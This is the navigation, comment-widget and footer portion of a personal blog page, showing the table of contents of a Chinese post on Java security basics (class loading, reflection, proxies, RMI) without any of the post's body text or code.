						<span class="post-nav-title-item">SQL 注入基础</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Java 安全基础</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JDK%EF%BC%88Java-Development-Kit%EF%BC%89"><span class="nav-text">JDK（Java Development Kit）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#JDK-%E7%9A%84%E7%BB%84%E6%88%90"><span class="nav-text">JDK 的组成</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JRE%EF%BC%88Java-Runtime-Environment%EF%BC%89"><span class="nav-text">JRE（Java Runtime Environment）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Java-%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88JVM%EF%BC%89"><span class="nav-text">Java 虚拟机（JVM）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java-%E6%A0%B8%E5%BF%83%E7%B1%BB%E5%BA%93%EF%BC%88Java-Core-Libraries%EF%BC%89"><span class="nav-text">Java 核心类库（Java Core Libraries）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%8E%A5%E5%8F%A3%EF%BC%88Native-Interface%EF%BC%89"><span class="nav-text">本地接口（Native Interface）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88ClassLoader%EF%BC%89"><span class="nav-text">Java 类加载器（ClassLoader）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7%EF%BC%88Java-Development-Tools%EF%BC%89"><span class="nav-text">Java 开发工具（Java Development Tools）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Java-%E7%BC%96%E8%AF%91%E5%99%A8%EF%BC%88javac%EF%BC%89"><span class="nav-text">Java 编译器（javac）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#java-%E5%BD%92%E6%A1%A3%E5%B7%A5%E5%85%B7%EF%BC%88jar%EF%BC%89"><span class="nav-text">java 归档工具（jar）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java-%E8%BF%90%E8%A1%8C%E5%B7%A5%E5%85%B7%EF%BC%88java%EF%BC%89"><span class="nav-text">Java 运行工具（java）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JDK-%E7%9A%84%E7%89%88%E6%9C%AC"><span class="nav-text">JDK 的版本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81-JDK-%E5%8F%91%E8%A1%8C%E7%89%88"><span class="nav-text">常见 JDK 发行版</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-JDK"><span class="nav-text">Oracle JDK</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OpenJDK"><span class="nav-text">OpenJDK</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JDK-%E7%9A%84%E7%89%88%E6%9C%AC%E5%8F%B7%E6%BC%94%E5%8F%98"><span class="nav-text">JDK 的版本号演变</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JDK-1-x-%E9%98%B6%E6%AE%B5%EF%BC%88Java-%E7%9A%84%E6%97%A9%E6%9C%9F%E7%89%88%E6%9C%AC%EF%BC%89"><span class="nav-text">JDK 1.x 阶段（Java 的早期版本）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java-x-%E9%98%B6%E6%AE%B5%EF%BC%88Java-%E8%AF%AD%E8%A8%80%E7%9A%84%E9%87%8D%E5%A4%A7%E5%8F%98%E9%9D%A9%EF%BC%89"><span class="nav-text">Java x 阶段（Java 语言的重大变革）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JDK-x-%E9%98%B6%E6%AE%B5%EF%BC%88%E7%8E%B0%E4%BB%A3%E7%9A%84-JDK-%E7%89%88%E6%9C%AC%EF%BC%89"><span class="nav-text">JDK x 阶段（现代的 JDK 版本）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8-IDEA-%E4%B8%AD%E5%88%87%E6%8D%A2-JDK"><span class="nav-text">在 IDEA 中切换 JDK</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%87%E6%8D%A2-Java-%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7"><span class="nav-text">切换 Java 开发工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%87%E6%8D%A2-JRE"><span class="nav-text">切换 JRE</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Java-%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">Java 字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A8%E6%80%81%E7%94%9F%E6%88%90"><span class="nav-text">字节码动态生成</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6"><span class="nav-text">类加载机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="nav-text">类加载的过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%EF%BC%88Loading%EF%BC%89"><span class="nav-text">加载（Loading）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%93%BE%E6%8E%A5%EF%BC%88Linking%EF%BC%89"><span class="nav-text">链接（Linking）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%EF%BC%88Initialization%EF%BC%89"><span class="nav-text">初始化（Initialization）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F"><span class="nav-text">类加载方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%98%BE%E5%BC%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD%EF%BC%88Explicit-Class-Loading%EF%BC%89"><span class="nav-text">显式类加载（Explicit Class Loading）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%8A%A0%E8%BD%BD"><span class="nav-text">通过反射机制加载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8A%A0%E8%BD%BD"><span class="nav-text">通过类加载器加载</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%90%E5%BC%8F%E7%B1%BB%E5%8A%A0%E8%BD%BD%EF%BC%88Implicit-Class-Loading%EF%BC%89"><span class="nav-text">隐式类加载（Implicit Class Loading）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1%E5%8A%A0%E8%BD%BD"><span class="nav-text">通过实例化对象加载</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E8%AE%BF%E9%97%AE%E9%9D%99%E6%80%81%E5%AD%97%E6%AE%B5%E6%88%96%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E5%8A%A0%E8%BD%BD"><span class="nav-text">通过访问静态字段或静态方法加载</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="nav-text">类加载器</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="nav-text">类加载器的类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%95%E5%AF%BC%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88Bootstrap-ClassLoader%EF%BC%89"><span class="nav-text">引导类加载器（Bootstrap ClassLoader）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A9%E5%B1%95%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88Extension-ClassLoader%EF%BC%89"><span class="nav-text">扩展类加载器（Extension ClassLoader）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88System-ClassLoader%EF%BC%89"><span class="nav-text">系统类加载器（System ClassLoader）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88Custom-ClassLoader%EF%BC%89"><span class="nav-text">自定义类加载器（Custom ClassLoader）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="nav-text">类加载器的获取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%B1%BB%E7%9A%84%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="nav-text">获取当前类的类加载器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%BA%BF%E7%A8%8B%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="nav-text">获取当前线程的上下文类加载器</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%88%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%EF%BC%89"><span class="nav-text">获取系统类加载器（系统类加载器）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%B8%B8%E8%A7%81%E6%96%B9%E6%B3%95"><span class="nav-text">类加载器常见方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#loadClass%EF%BC%88%E5%8A%A0%E8%BD%BD%E6%8C%87%E5%AE%9A%E7%9A%84-Java-%E7%B1%BB%EF%BC%89"><span class="nav-text">loadClass（加载指定的 Java 类）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#findClass%EF%BC%88%E6%9F%A5%E6%89%BE%E6%8C%87%E5%AE%9A%E7%9A%84-Java-%E7%B1%BB%EF%BC%89"><span class="nav-text">findClass（查找指定的 Java 类）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#findLoadedClass%EF%BC%88%E6%9F%A5%E6%89%BE-JVM-%E5%B7%B2%E7%BB%8F%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%9A%84%E7%B1%BB%EF%BC%89"><span class="nav-text">findLoadedClass（查找 JVM 已经加载过的类）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#defineClass%EF%BC%88%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA-Java-%E7%B1%BB%EF%BC%89"><span class="nav-text">defineClass（定义一个 Java 类）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#resolveClass%EF%BC%88%E9%93%BE%E6%8E%A5%E6%8C%87%E5%AE%9A%E7%9A%84-Java-%E7%B1%BB%EF%BC%89"><span class="nav-text">resolveClass（链接指定的 Java 类）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B%EF%BC%88Parent-Delegation-Model%EF%BC%89"><span class="nav-text">双亲委派模型（Parent Delegation Model）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84"><span class="nav-text">类加载器层次结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="nav-text">双亲委派模型具体实现</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%B8%8E%E7%B1%BB%E7%9A%84%E9%9A%94%E7%A6%BB%E6%80%A7"><span class="nav-text">类加载器与类的隔离性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="nav-text">类命名空间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E7%9A%84%E9%9A%94%E7%A6%BB%E6%80%A7"><span class="nav-text">类加载的隔离性</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">动态加载字节码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#defineClass"><span class="nav-text">defineClass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JS-%E5%BC%95%E6%93%8E"><span class="nav-text">JS 引擎</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#URLClassLoader"><span class="nav-text">URLClassLoader</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TemplatesImpl"><span class="nav-text">TemplatesImpl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BCEL-ClassLoader"><span class="nav-text">BCEL ClassLoader</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84"><span class="nav-text">反射</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-Class-%E5%AE%9E%E4%BE%8B"><span class="nav-text">获取 Class 实例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E7%B1%BB%E5%90%8D%E8%8E%B7%E5%8F%96"><span class="nav-text">通过类名获取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E5%AF%B9%E8%B1%A1%E8%8E%B7%E5%8F%96"><span class="nav-text">通过对象获取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E7%B1%BB%E7%9A%84-class-%E5%B1%9E%E6%80%A7%E8%8E%B7%E5%8F%96"><span class="nav-text">通过类的 .class 属性获取</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E5%AD%97%E6%AE%B5"><span class="nav-text">操作字段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5"><span class="nav-text">获取字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="nav-text">获取字段值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="nav-text">设置字段值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9-final-%E5%8F%98%E9%87%8F"><span class="nav-text">修改 final 变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95"><span class="nav-text">操作方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%96%B9%E6%B3%95"><span class="nav-text">获取方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-text">调用方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%93%8D%E4%BD%9C%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-text">操作构造函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-text">获取构造函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1"><span class="nav-text">创建对象</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unsafe-%E7%B1%BB"><span class="nav-text">Unsafe 类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-Unsafe-%E5%AE%9E%E4%BE%8B"><span class="nav-text">获取 Unsafe 实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E7%9A%84%E5%86%85%E5%AD%98%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-text">获取字段的内存偏移量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E5%AD%97%E6%AE%B5%E7%9A%84%E8%AF%BB%E5%86%99"><span class="nav-text">对象字段的读写</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AB%98%E7%89%88%E6%9C%AC-JDK-%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87"><span class="nav-text">高版本 JDK 反射绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#9%E2%89%A4JDK"><span class="nav-text">9≤JDK&lt;12</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%E5%8C%96%E7%B3%BB%E7%BB%9F"><span class="nav-text">模块化系统</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-text">限制条件分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-text">绕过方法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12%E2%89%A4JDK"><span class="nav-text">12≤JDK&lt;17</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90-1"><span class="nav-text">限制条件分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B0%83%E7%94%A8-getDeclaredFields0-%E5%87%BD%E6%95%B0"><span class="nav-text">调用 getDeclaredFields0 函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BD%AE%E7%A9%BA-fieldFilterMap"><span class="nav-text">置空 fieldFilterMap</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JDK-%E2%89%A5-17"><span class="nav-text">JDK ≥ 17</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%88%86%E6%9E%90-2"><span class="nav-text">限制条件分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-2"><span class="nav-text">绕过方法</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">反射执行命令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#getRuntime"><span class="nav-text">getRuntime</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ProcessBuilder"><span class="nav-text">ProcessBuilder</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%90%86"><span class="nav-text">代理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-text">静态代理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="nav-text">静态代理的概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="nav-text">静态代理的实现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-text">动态代理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="nav-text">动态代理的概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="nav-text">基于接口的动态代理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="nav-text">代码实现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-text">原理分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%EF%BC%88CGLIB%EF%BC%89"><span class="nav-text">基于类的动态代理（CGLIB）</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8"><span class="nav-text">远程过程调用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI%EF%BC%88Remote-Method-Invocation%EF%BC%89"><span class="nav-text">RMI（Remote Method Invocation）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI%E7%9A%84%E4%B8%BB%E8%A6%81%E7%BB%84%E4%BB%B6"><span class="nav-text">RMI的主要组件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%8E%A5%E5%8F%A3%EF%BC%88Remote-Interface%EF%BC%89"><span class="nav-text">远程接口（Remote Interface）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0%E7%B1%BB%EF%BC%88Remote-Object-Implementation%EF%BC%89"><span class="nav-text">远程对象实现类（Remote Object Implementation）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%98%E6%A0%B9%EF%BC%88Stub%EF%BC%89%E5%92%8C%E9%AA%A8%E6%9E%B6%EF%BC%88Skeleton%EF%BC%89"><span class="nav-text">存根（Stub）和骨架（Skeleton）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RMI-%E6%B3%A8%E5%86%8C%E8%A1%A8%EF%BC%88RMI-Registry%EF%BC%89"><span class="nav-text">RMI 注册表（RMI Registry）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8-RMI-%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="nav-text">启动 RMI 注册表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B3%A8%E5%86%8C%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="nav-text">服务端注册远程对象</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%9F%A5%E6%89%BE%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1"><span class="nav-text">客户端查找远程对象</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-text">RMI 工作流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C"><span class="nav-text">服务注册</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E5%88%9B%E5%BB%BA"><span class="nav-text">远程对象创建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%88%9B%E5%BB%BA"><span class="nav-text">注册中心创建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C-1"><span class="nav-text">服务注册</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="nav-text">服务发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E8%B0%83%E7%94%A8"><span class="nav-text">服务调用</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        30 posts in total
                    </span>
                    
                        <span>
                            506.7k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
